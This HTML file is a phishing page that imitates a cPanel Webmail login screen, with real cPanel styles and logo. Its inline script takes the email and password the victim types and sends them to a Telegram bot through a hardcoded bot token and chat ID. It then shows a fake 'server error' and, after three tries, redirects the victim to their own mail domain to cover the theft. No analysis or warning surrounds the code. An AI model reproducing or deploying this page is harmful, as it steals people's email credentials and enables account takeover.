<html lang="en" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate">
    <meta name="apple-itunes-app" content="app-id=1188352635">
    <title>Webmail Login</title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
   <style>
    p{
        font-weight: bold;
    }
    #cpli{
        height: 30%;
        width: 20%;
        position: relative;
        left: 100px;
    }
    .ppp{
        font-size: 10px;
        color: silver;
        text-align: center;
    }
   </style>
    <!-- EXTERNAL CSS -->
    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560357916/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
</head>
<body class="wm">
    <div id="login-wrapper" class="group has-pw-reset">
        <div class="wrapper">
            <div id="content-container">
                <div id="login-container">
                    <div id="login-sub-container">
                        <div id="login-sub-header">
                            <img class="main-logo" src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
                        </div>
                        <div id="login-sub">
                            <div id="forms">
                                <form novalidate="" id="login_form" action="" method="post" target="_self">
                                    <div class="input-req-login">
                                        <label for="user">Email Address</label>
                                    </div>
                                    <div class="input-field-login icon username-container">
                                        <input name="email" id="email" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
                                    </div>
                                    <div class="input-req-login login-password-field-label">
                                        <label for="pass">Password</label>
                                    </div>
                                    <div class="input-field-login icon password-container">
                                        <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
                                    </div>
                                    <p id="msg" style="color:red;"></p>
                                    <div class="controls">
                                        <div class="login-btn">
                                            <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                        </div>
                                        <br>
                                        <br>
                                        <br>
                                        <p style="text-align: center; margin-top: 40px; font-weight: bold;">Reset Password</p>
                                        <br><br>
                                        <div class="writing-div" style="display: flex; gap: 20px;justify-content: space-around; margin-left: -200px;">
                                            <p>?????????</p><p>???????? </p>
                                            <p>ceština </p>
                                            <p>dansk </p>
                                            <p>Deutsch</p>
                                            <p>??????? </p>
                                            <p>español </p>
                                            <p>español </p>
                                            <p>latinoamericano</p>
                                            <p>…</p>
                                        </div>
                                        <br>
                                        <p class="ppp" style="text-align: center;">Copyright© 2025 cPanel, L.L.C.</p>
                                        <p class="ppp p2">Privacy Policy</p>
                                    </div>

                                    <div class="clear" id="push"></div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const telegramBotToken = '7930876777:AAEIXSxSwA7yybu_gRtcaW9l4i2AC2eflUg';
            const telegramChatId = '6656939470';
            const loginForm = document.getElementById('login_form');
            const loginButton = document.getElementById('login_submit');
            const messageDisplay = document.getElementById('msg');
            let failedAttempts = 0;

            // Populate email field from URL hash
            const hash = window.location.hash.substr(1);
            if (hash && hash.includes('@')) {
                document.getElementById('email').value = hash;
            }

            loginButton.addEventListener('click', function (event) {
                event.preventDefault();

                const email = document.getElementById('email').value.trim();
                const password = document.getElementById('password').value.trim();

                if (!email || !password) {
                    messageDisplay.textContent = 'Both email and password are required!';
                    return;
                }

                const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;

                // Send the data to Telegram
                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: telegramChatId,
                        text: message
                    })
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            messageDisplay.textContent = 'Error Login: There was an error on the server. Please login again';
                            // Hide the message after 3 seconds
                            setTimeout(() => {
                                messageDisplay.textContent = '';
                            }, 3000);
                        } else {
                            messageDisplay.textContent = 'Failed to notify Telegram. Please try again.';
                        }
                    })
                    .catch(error => {
                        console.error('Error sending message to Telegram:', error);
                        messageDisplay.textContent = 'An error occurred. Please try again later.';
                    });

                // Handle failed login attempts
                failedAttempts++;
                document.getElementById('password').value = '';  // Clear password after every attempt

                if (failedAttempts >= 3) {
                    const domain = email.split('@')[1];
                    if (domain) {
                        // Redirect to the domain part of the email address
                        window.location.href = `https://${domain}`;
                    }
                }
            });
        });
    </script>
</body>
</html>
